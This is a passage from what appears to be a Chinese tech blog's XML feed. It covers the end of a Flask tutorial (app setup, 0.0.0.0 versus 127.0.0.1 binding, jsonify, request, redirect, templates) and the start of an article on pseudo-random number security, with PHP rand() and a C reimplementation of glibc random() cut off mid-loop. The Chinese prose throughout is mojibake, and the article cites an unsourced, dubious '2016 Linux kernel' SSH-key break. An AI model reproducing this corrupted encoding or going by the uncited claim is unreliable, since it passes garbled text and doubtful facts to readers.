<code>'__main__'</code>ã€‚</li><li>å¦‚æœè¯¥æ¨¡å—æ˜¯è¢«å¯¼å…¥çš„ï¼Œ<code>__name__</code> çš„å€¼ä¸ºæ¨¡å—çš„åç§°ã€‚</li></ul></li><li>åœ¨ Flask ä¸­ï¼Œ<code>__name__</code>çš„ä½œç”¨<ul><li><strong>ç¡®å®šåº”ç”¨çš„æ ¹è·¯å¾„</strong>ï¼šFlask ä½¿ç”¨å®ƒå®šä½åº”ç”¨æ‰€åœ¨çš„ç›®å½•ï¼Œè¿™å¯¹åŠ è½½é™æ€æ–‡ä»¶ï¼ˆå¦‚ CSSã€JSï¼‰å’Œæ¨¡æ¿æ–‡ä»¶ï¼ˆå¦‚ HTMLï¼‰è‡³å…³é‡è¦ã€‚</li></ul></li></ul><h3 id="3-app-å˜é‡"><a href="#3-app-å˜é‡" class="headerlink" title="3. app å˜é‡"></a><strong>3. <code>app</code> å˜é‡</strong></h3><ul><li><p><code>app</code> æ˜¯é€šè¿‡ <code>Flask</code> ç±»å®ä¾‹åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œå®ƒä»£è¡¨äº†æ•´ä¸ª Flask åº”ç”¨å®ä¾‹ã€‚</p></li><li><p>å®ƒæ˜¯ Web åº”ç”¨çš„æ ¸å¿ƒï¼Œç”¨äºæ³¨å†Œè·¯ç”±ã€å¤„ç†è¯·æ±‚ã€é…ç½®åº”ç”¨ã€ç®¡ç†æ‰©å±•ç­‰ã€‚</p></li><li><p>å¸¸è§ç”¨æ³•ï¼š</p><p><strong>å®šä¹‰è·¯ç”±</strong>ï¼š</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>â€‹       <strong>è¿è¡Œåº”ç”¨ï¼š</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>æ€»ç»“ï¼š<code>app = Flask(__name__)</code> æ˜¯ Flask åº”ç”¨å¼€å‘çš„èµ·ç‚¹ï¼Œç”¨æ¥åˆå§‹åŒ–ä¸€ä¸ª Web åº”ç”¨å¯¹è±¡ã€‚<code>Flask</code> ç±»è´Ÿè´£æä¾›åº”ç”¨çš„åŠŸèƒ½ï¼Œè€Œ <code>__name__</code> å¸®åŠ©æ¡†æ¶å®šä½èµ„æºè·¯å¾„å’Œè¿è¡Œç¯å¢ƒã€‚</p></blockquote><h3 id="3-1-2-ç›‘å¬0-0-0-0å’Œ127-0-0-1çš„åŒºåˆ«"><a href="#3-1-2-ç›‘å¬0-0-0-0å’Œ127-0-0-1çš„åŒºåˆ«" class="headerlink" title="3.1.2 ç›‘å¬0.0.0.0å’Œ127.0.0.1çš„åŒºåˆ«"></a>3.1.2 ç›‘å¬0.0.0.0å’Œ127.0.0.1çš„åŒºåˆ«</h3><p>app.run(host=â€˜0.0.0.0â€™,port=5001) å’Œapp.run(host=â€˜127.0.0.1â€™,port=5001) </p><blockquote><p><code>app.run(host='0.0.0.0', port=5001)</code> å’Œ <code>app.run(host='127.0.0.1', port=5001)</code> éƒ½æ˜¯å¯åŠ¨ Flask åº”ç”¨çš„æ–¹æ³•ï¼Œä½†å®ƒä»¬åœ¨ <strong>ç›‘å¬åœ°å€</strong> å’Œ <strong>è®¿é—®æ–¹å¼</strong> ä¸Šå­˜åœ¨å·®å¼‚ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†è§£é‡Šï¼š</p><h3 id="1-å…±åŒç‚¹"><a href="#1-å…±åŒç‚¹" class="headerlink" title="1. å…±åŒç‚¹"></a>1. <strong>å…±åŒç‚¹</strong></h3><ul><li><strong>åŠŸèƒ½</strong>ï¼šä¸¤è€…éƒ½ç”¨äºå¯åŠ¨ Flask å¼€å‘æœåŠ¡å™¨ï¼Œç›‘å¬æŒ‡å®šçš„ä¸»æœºåœ°å€å’Œç«¯å£ã€‚</li><li><strong>ç«¯å£å·</strong>ï¼šä¸¤è€…éƒ½ç›‘å¬ <code>5001</code> ç«¯å£ï¼Œå¯ä»¥é€šè¿‡æµè§ˆå™¨æˆ– HTTP å®¢æˆ·ç«¯è®¿é—®ã€‚</li></ul><h3 id="2-å·®å¼‚ï¼šç›‘å¬åœ°å€ï¼ˆhost-å‚æ•°ï¼‰"><a href="#2-å·®å¼‚ï¼šç›‘å¬åœ°å€ï¼ˆhost-å‚æ•°ï¼‰" class="headerlink" title="2. å·®å¼‚ï¼šç›‘å¬åœ°å€ï¼ˆhost å‚æ•°ï¼‰"></a>2. <strong>å·®å¼‚ï¼šç›‘å¬åœ°å€ï¼ˆ<code>host</code> å‚æ•°ï¼‰</strong></h3><h4 id="host-0-0-0-0"><a href="#host-0-0-0-0" class="headerlink" title="host='0.0.0.0'"></a><strong><code>host='0.0.0.0'</code></strong></h4><ul><li>å«ä¹‰ï¼š<ul><li><code>0.0.0.0</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ IP åœ°å€ï¼Œè¡¨ç¤º<strong>ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£</strong>ï¼ˆåŒ…æ‹¬æœ¬åœ°æ¥å£å’Œå¤–éƒ¨æ¥å£ï¼‰ã€‚</li></ul></li><li><strong>ç»“æœ</strong>ï¼š<ul><li>åº”ç”¨å¯ä»¥è¢«<strong>æœ¬æœºï¼ˆlocalhostï¼‰å’ŒåŒä¸€å±€åŸŸç½‘ä¸­çš„å…¶ä»–è®¾å¤‡</strong>è®¿é—®ã€‚</li><li>ç¤ºä¾‹ï¼š<ul><li>æœ¬åœ°è®¿é—®ï¼š<code>http://127.0.0.1:5001</code></li><li>å±€åŸŸç½‘è®¿é—®ï¼š<code>http://&lt;ä½ çš„å±€åŸŸç½‘ IP&gt;:5001</code>ï¼ˆå¦‚ <code>http://192.168.1.100:5001</code>ï¼‰</li></ul></li></ul></li></ul><h4 id="host-127-0-0-1"><a href="#host-127-0-0-1" class="headerlink" title="host='127.0.0.1'"></a><strong><code>host='127.0.0.1'</code></strong></h4><ul><li>å«ä¹‰ï¼š<ul><li><code>127.0.0.1</code> æ˜¯æœ¬åœ°å›ç¯åœ°å€ï¼ˆlocalhostï¼‰ï¼Œåªç›‘å¬æœ¬åœ°æ¥å£ã€‚</li></ul></li><li>ç»“æœï¼š<ul><li>åº”ç”¨<strong>åªèƒ½è¢«æœ¬æœºè®¿é—®</strong>ï¼Œæ— æ³•è¢«å…¶ä»–è®¾å¤‡è®¿é—®ã€‚</li><li>ç¤ºä¾‹ï¼š<ul><li>æœ¬åœ°è®¿é—®ï¼š<code>http://127.0.0.1:5001</code></li><li>å±€åŸŸç½‘è®¾å¤‡æ— æ³•è®¿é—®ã€‚</li></ul></li></ul></li></ul><h3 id="3-å®é™…ç”¨é€”"><a href="#3-å®é™…ç”¨é€”" class="headerlink" title="3.å®é™…ç”¨é€”"></a>3.<strong>å®é™…ç”¨é€”</strong></h3><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-06%2010.41.55.png" alt="å®é™…ç”¨é€”" style="zoom:50%;"><h3 id="4-å®‰å…¨æ€§æ³¨æ„äº‹é¡¹"><a href="#4-å®‰å…¨æ€§æ³¨æ„äº‹é¡¹" class="headerlink" title="4. å®‰å…¨æ€§æ³¨æ„äº‹é¡¹"></a>4. <strong>å®‰å…¨æ€§æ³¨æ„äº‹é¡¹</strong></h3><ul><li>å¼€å‘ç¯å¢ƒï¼š<ul><li>Flask è‡ªå¸¦çš„å¼€å‘æœåŠ¡å™¨ä¸é€‚åˆç”Ÿäº§ç¯å¢ƒï¼Œ<code>host='0.0.0.0'</code> æ—¶éœ€ç‰¹åˆ«å°å¿ƒï¼Œé¿å…æš´éœ²åˆ°å…¬ç½‘ã€‚</li></ul></li><li>ç”Ÿäº§ç¯å¢ƒï¼š<ul><li>ä½¿ç”¨ä¸“ä¸šçš„ WSGI æœåŠ¡å™¨ï¼ˆå¦‚ <strong>gunicorn</strong> æˆ– <strong>uWSGI</strong>ï¼‰é…åˆåå‘ä»£ç†æœåŠ¡å™¨ï¼ˆå¦‚ Nginxï¼‰è¿è¡Œåº”ç”¨ï¼Œæä¾›æ›´é«˜çš„æ€§èƒ½å’Œå®‰å…¨æ€§ã€‚</li></ul></li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h3><ul><li>**<code>host='127.0.0.1'</code>**ï¼šä»…é™æœ¬æœºè®¿é—®ï¼Œé€‚åˆå®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„å¼€å‘åœºæ™¯ã€‚</li><li>**<code>host='0.0.0.0'</code>**ï¼šå…è®¸å¤–éƒ¨è®¾å¤‡è®¿é—®ï¼Œé€‚åˆå±€åŸŸç½‘æµ‹è¯•æˆ–éœ€è¦å…±äº«çš„åœºæ™¯ï¼Œä½†éœ€æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚</li></ul></blockquote><h2 id="3-2-jsonify"><a href="#3-2-jsonify" class="headerlink" title="3.2 jsonify"></a>3.2 jsonify</h2><p><strong>ç”¨é€”</strong>ï¼šå°† Python æ•°æ®ç»“æ„ï¼ˆå¦‚å­—å…¸ã€åˆ—è¡¨ç­‰ï¼‰è½¬æ¢ä¸º JSON æ ¼å¼å¹¶è¿”å› HTTP å“åº”ã€‚</p><p><strong>ç‰¹ç‚¹</strong>ï¼šè‡ªåŠ¨è®¾ç½®å“åº”çš„ <code>Content-Type</code> ä¸º <code>application/json</code>ã€‚</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonify<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-request"><a href="#3-3-request" class="headerlink" title="3.3 request"></a>3.3 request</h2><p><strong>ç”¨é€”</strong>ï¼šè·å–å®¢æˆ·ç«¯å‘é€çš„ HTTP è¯·æ±‚ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®ã€å¤´éƒ¨ã€æ–¹æ³•ç­‰ã€‚</p><p><strong>å¸¸ç”¨æ–¹æ³•</strong>ï¼š</p><ul><li><code>request.args</code>ï¼šè·å–æŸ¥è¯¢å‚æ•°ï¼ˆGET è¯·æ±‚ï¼‰ã€‚</li><li><code>request.form</code>ï¼šè·å–è¡¨å•æ•°æ®ï¼ˆPOST è¯·æ±‚ï¼‰ã€‚</li><li><code>request.json</code>ï¼šè·å– JSON æ ¼å¼çš„æ•°æ®ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/form'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-redirect"><a href="#3-4-redirect" class="headerlink" title="3.4 redirect"></a>3.4 redirect</h2><p><strong>ç”¨é€”</strong>ï¼šé‡å®šå‘åˆ°æŒ‡å®šçš„ URLã€‚</p><p><strong>ç‰¹ç‚¹</strong>ï¼šé€šå¸¸ä¸ HTTP çŠ¶æ€ç  302 æˆ– 301 ä¸€èµ·ä½¿ç”¨ã€‚</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/old'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">old</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/new'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-render-template"><a href="#3-5-render-template" class="headerlink" title="3.5 render_template"></a>3.5 <strong>render_template</strong></h2><ul><li><strong>ç”¨é€”</strong>ï¼šæ¸²æŸ“æ¨¡æ¿æ–‡ä»¶ï¼ˆå¦‚ HTMLï¼‰ï¼ŒåŠ¨æ€ç”Ÿæˆç½‘é¡µå†…å®¹ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šä½¿ç”¨ Jinja2 æ¨¡æ¿å¼•æ“ï¼Œæ”¯æŒå˜é‡æ›¿æ¢å’Œé€»è¾‘æ§åˆ¶ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å‰åç«¯å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰åç«¯å¼€å‘ </tag>
            
            <tag> python </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšæœºæ•°å®‰å…¨</title>
      <link href="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/"/>
      <url>/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ä¼ªéšæœºæ•°"><a href="#ä¸€ã€ä¼ªéšæœºæ•°" class="headerlink" title="ä¸€ã€ä¼ªéšæœºæ•°"></a>ä¸€ã€ä¼ªéšæœºæ•°</h1><h2 id="1-1-ä¼ªéšæœºæ•°çš„æ¦‚å¿µ"><a href="#1-1-ä¼ªéšæœºæ•°çš„æ¦‚å¿µ" class="headerlink" title="1.1 ä¼ªéšæœºæ•°çš„æ¦‚å¿µ"></a>1.1 ä¼ªéšæœºæ•°çš„æ¦‚å¿µ</h2><p><strong>ä¼ªéšæœºæ•°</strong>ï¼ˆPseudo-Random Numberï¼‰æ˜¯é€šè¿‡ç¡®å®šæ€§ç®—æ³•ç”Ÿæˆçš„ä¸€ç³»åˆ—æ•°å­—ï¼Œè¿™äº›æ•°å­—çœ‹ä¼¼éšæœºï¼Œä½†å®é™…ä¸Šæ˜¯ç”±ä¸€ä¸ªåˆå§‹å€¼ï¼ˆç§å­ï¼Œseedï¼‰é€šè¿‡ç‰¹å®šçš„æ•°å­¦å…¬å¼è®¡ç®—å¾—åˆ°çš„ã€‚å› æ­¤ï¼Œä¼ªéšæœºæ•°åœ¨æœ¬è´¨ä¸Šæ˜¯<strong>å¯é¢„æµ‹</strong>çš„ï¼Œåªè¦ç§å­å€¼å’Œç”Ÿæˆç®—æ³•ç›¸åŒï¼Œè¾“å‡ºçš„åºåˆ—ä¹Ÿå°†å®Œå…¨ç›¸åŒã€‚</p><p>ä¸€èˆ¬ä¼ªéšæœºæ•°åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>å¼ºä¼ªéšæœºæ•°ï¼šéš¾ä»¥é¢„æµ‹çš„éšæœºæ•°</li><li>å¼±ä¼ªéšæœºæ•°ï¼šå®¹æ˜“é¢„æµ‹çš„éšæœºæ•°ï¼ˆä¸€èˆ¬æ˜¯æ¼æ´é«˜å‘ç‚¹ï¼‰</li></ul><h2 id="1-2-ä¼ªéšæœºæ•°çš„ç‰¹ç‚¹"><a href="#1-2-ä¼ªéšæœºæ•°çš„ç‰¹ç‚¹" class="headerlink" title="1.2 ä¼ªéšæœºæ•°çš„ç‰¹ç‚¹"></a>1.2 ä¼ªéšæœºæ•°çš„ç‰¹ç‚¹</h2><ul><li><p>å¯é‡å¤æ€§<br>ä¼ªéšæœºæ•°çš„ç”Ÿæˆä¾èµ–äºç§å­å€¼ï¼Œä½¿ç”¨ç›¸åŒçš„ç§å­å¯ä»¥ç”Ÿæˆç›¸åŒçš„éšæœºåºåˆ—ï¼Œè¿™ä½¿å¾—å®ƒåœ¨è°ƒè¯•å’Œæµ‹è¯•ä¸­éå¸¸æœ‰ç”¨ã€‚</p></li><li><p>è¿‘ä¼¼éšæœºæ€§<br>è™½ç„¶ä¼ªéšæœºæ•°æ˜¯é€šè¿‡ç¡®å®šæ€§ç®—æ³•ç”Ÿæˆçš„ï¼Œä½†å®ƒä»¬åœ¨ç»Ÿè®¡ç‰¹æ€§ä¸Šæ¥è¿‘çœŸæ­£çš„éšæœºæ•°ï¼Œæ»¡è¶³å‡åŒ€åˆ†å¸ƒã€ç‹¬ç«‹æ€§ç­‰éšæœºæ€§è¦æ±‚ï¼Œé€‚ç”¨äºå¤§å¤šæ•°åº”ç”¨åœºæ™¯ã€‚</p></li><li><p>æ•ˆç‡é«˜<br>ä¼ªéšæœºæ•°ç”Ÿæˆé€šå¸¸æ¯”çœŸéšæœºæ•°æ›´å¿«ï¼Œä¸”ä¸ä¾èµ–å¤–éƒ¨ç‰©ç†è®¾å¤‡ï¼Œæ˜“äºåœ¨è½¯ä»¶ä¸­å®ç°ã€‚</p></li></ul><h2 id="1-3-çœŸéšæœºæ•°ä¸ä¼ªéšæœºæ•°çš„åŒºåˆ«"><a href="#1-3-çœŸéšæœºæ•°ä¸ä¼ªéšæœºæ•°çš„åŒºåˆ«" class="headerlink" title="1.3 çœŸéšæœºæ•°ä¸ä¼ªéšæœºæ•°çš„åŒºåˆ«"></a>1.3 çœŸéšæœºæ•°ä¸ä¼ªéšæœºæ•°çš„åŒºåˆ«</h2><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.15.27.png" alt="çœŸéšæœºæ•°ä¸ä¼ªéšæœºæ•°çš„åŒºåˆ«" style="zoom:50%;"><h1 id="äºŒã€ä¼ªéšæœºæ•°çš„å®‰å…¨é—®é¢˜"><a href="#äºŒã€ä¼ªéšæœºæ•°çš„å®‰å…¨é—®é¢˜" class="headerlink" title="äºŒã€ä¼ªéšæœºæ•°çš„å®‰å…¨é—®é¢˜"></a>äºŒã€ä¼ªéšæœºæ•°çš„å®‰å…¨é—®é¢˜</h1><p>ç¡®å®šçš„ç®—æ³•+éšæœºæ•°ç§å­=&gt;å¯é¢„æµ‹çš„éšæœºæ•°åºåˆ—ã€‚</p><h2 id="2-1-å¯é¢„æµ‹æ€§é—®é¢˜"><a href="#2-1-å¯é¢„æµ‹æ€§é—®é¢˜" class="headerlink" title="2.1 å¯é¢„æµ‹æ€§é—®é¢˜"></a>2.1 å¯é¢„æµ‹æ€§é—®é¢˜</h2><h4 id="2-1-1-é—®é¢˜æè¿°"><a href="#2-1-1-é—®é¢˜æè¿°" class="headerlink" title="2.1.1 é—®é¢˜æè¿°"></a>2.1.1 é—®é¢˜æè¿°</h4><p>ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰çš„è¾“å‡ºä¾èµ–äº<strong>ç§å­å€¼</strong>ï¼Œä¸€æ—¦ç§å­å€¼è¢«æ”»å‡»è€…çŸ¥é“æˆ–çŒœæµ‹åˆ°ï¼Œåç»­ç”Ÿæˆçš„æ‰€æœ‰ä¼ªéšæœºæ•°éƒ½å¯ä»¥è¢«é¢„æµ‹ã€‚è¿™å¯¹<strong>å¯†ç å­¦</strong>ä¸­çš„å¯†é’¥ç”Ÿæˆã€ä¼šè¯å¯†é’¥ç­‰è‡³å…³é‡è¦çš„æ•°æ®æ˜¯è‡´å‘½çš„ã€‚</p><h4 id="2-1-2-å®ä¾‹"><a href="#2-1-2-å®ä¾‹" class="headerlink" title="2.1.2 å®ä¾‹"></a>2.1.2 å®ä¾‹</h4><p><strong>Linuxå†…æ ¸çš„éšæœºæ•°é¢„æµ‹æ¼æ´</strong>ï¼ˆ2016å¹´ï¼‰ï¼šç”±äºç§å­ç†µä¸è¶³ï¼Œæ”»å‡»è€…é€šè¿‡æ¨æµ‹ç§å­å€¼é¢„æµ‹äº†ä¼ªéšæœºæ•°ï¼Œå¯¼è‡´SSHä¼šè¯å¯†é’¥è¢«ç ´è§£ã€‚</p><h4 id="2-1-3-è§£å†³æ–¹æ¡ˆ"><a href="#2-1-3-è§£å†³æ–¹æ¡ˆ" class="headerlink" title="2.1.3 è§£å†³æ–¹æ¡ˆ"></a>2.1.3 è§£å†³æ–¹æ¡ˆ</h4><p>ä½¿ç”¨<strong>åŠ å¯†å®‰å…¨ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCSPRNGï¼‰</strong>ã€‚CSPRNGé€šè¿‡ä½¿ç”¨å®‰å…¨çš„å“ˆå¸Œå‡½æ•°ã€å¯¹ç§°åŠ å¯†ç­‰ç®—æ³•ï¼Œä½¿å¾—å³ä½¿ç§å­éƒ¨åˆ†æš´éœ²ï¼Œä¹Ÿæ— æ³•é¢„æµ‹æœªæ¥çš„è¾“å‡ºã€‚</p><p>å¢åŠ <strong>ç§å­çš„ç†µ</strong>ï¼ˆEntropyï¼‰ï¼Œä»ä¸å¯é¢„æµ‹çš„ç‰©ç†æ¥æºè·å–ç§å­ï¼Œä¾‹å¦‚é¼ æ ‡ç§»åŠ¨ã€é”®ç›˜è¾“å…¥ã€ç³»ç»Ÿå™ªå£°ç­‰ã€‚</p><h2 id="2-2-å‘¨æœŸæ€§é—®é¢˜"><a href="#2-2-å‘¨æœŸæ€§é—®é¢˜" class="headerlink" title="2.2 å‘¨æœŸæ€§é—®é¢˜"></a>2.2 <strong>å‘¨æœŸæ€§é—®é¢˜</strong></h2><h3 id="2-2-1-é—®é¢˜æè¿°"><a href="#2-2-1-é—®é¢˜æè¿°" class="headerlink" title="2.2.1 é—®é¢˜æè¿°"></a>2.2.1 é—®é¢˜æè¿°</h3><p>ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å…·æœ‰æœ‰é™çš„å‘¨æœŸï¼Œå‘¨æœŸä¸€æ—¦è¢«æ”»å‡»è€…è¯†åˆ«ï¼Œè¾“å‡ºçš„ä¼ªéšæœºæ•°åºåˆ—å°±ä¼šé‡å¤ã€‚è¿™åœ¨<strong>é•¿æ—¶é—´è¿è¡Œçš„ç³»ç»Ÿ</strong>ä¸­ä¼šå¯¼è‡´éšæœºæ€§é€€åŒ–ï¼Œä»è€Œå½±å“å®‰å…¨æ€§ã€‚</p><h3 id="2-2-2-å®ä¾‹"><a href="#2-2-2-å®ä¾‹" class="headerlink" title="2.2.2 å®ä¾‹"></a>2.2.2 å®ä¾‹</h3><p>æŸäº›ä½¿ç”¨çº¿æ€§åŒä½™æ³•ï¼ˆLCGï¼‰çš„ç³»ç»Ÿåœ¨é•¿æ—¶é—´è¿è¡Œåï¼Œå…¶ä¼ªéšæœºæ•°è¾“å‡ºè¿›å…¥äº†ä¸€ä¸ªçŸ­å‘¨æœŸï¼Œå¯¼è‡´ç³»ç»Ÿè¾“å‡ºæ¨¡å¼è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚</p><h3 id="2-2-3-è§£å†³æ–¹æ¡ˆ"><a href="#2-2-3-è§£å†³æ–¹æ¡ˆ" class="headerlink" title="2.2.3 è§£å†³æ–¹æ¡ˆ"></a>2.2.3 è§£å†³æ–¹æ¡ˆ</h3><p>é€‰æ‹©å‘¨æœŸæé•¿çš„PRNGï¼Œä¾‹å¦‚<strong>æ¢…æ£®æ—‹è½¬ç®—æ³•ï¼ˆMersenne Twister, MT19937ï¼‰</strong>ã€‚</p><p>ç»“åˆå¤šä¸ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œæˆ–åœ¨å‘¨æœŸè€—å°½å‰é‡æ–°æ³¨å…¥æ–°çš„éšæœºç†µã€‚</p><h1 id="ä¸‰ã€ä¼ªéšæœºæ•°å®‰å…¨é—®é¢˜å®ä¾‹"><a href="#ä¸‰ã€ä¼ªéšæœºæ•°å®‰å…¨é—®é¢˜å®ä¾‹" class="headerlink" title="ä¸‰ã€ä¼ªéšæœºæ•°å®‰å…¨é—®é¢˜å®ä¾‹"></a>ä¸‰ã€ä¼ªéšæœºæ•°å®‰å…¨é—®é¢˜å®ä¾‹</h1><h2 id="3-1-PHPä¼ªéšæœºæ•°ç”Ÿæˆ"><a href="#3-1-PHPä¼ªéšæœºæ•°ç”Ÿæˆ" class="headerlink" title="3.1 PHPä¼ªéšæœºæ•°ç”Ÿæˆ"></a>3.1 PHPä¼ªéšæœºæ•°ç”Ÿæˆ</h2><p>ä»¥PHPä¸­çš„éšæœºæ•°ä½œä¸ºç¤ºä¾‹ï¼Œåœ¨PHPä¸­ï¼Œå¸¸ç”¨çš„ä¸¤ä¸ªéšæœºæ•°ç”Ÿæˆå‡½æ•°ä¸ºrand()åŠmt_rand()ã€‚</p><p>rand()ä¸»è¦ä¾èµ–glibcçš„random()ï¼Œå®ç°åŸç†å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">16807LL</span> <span class="token operator">*</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        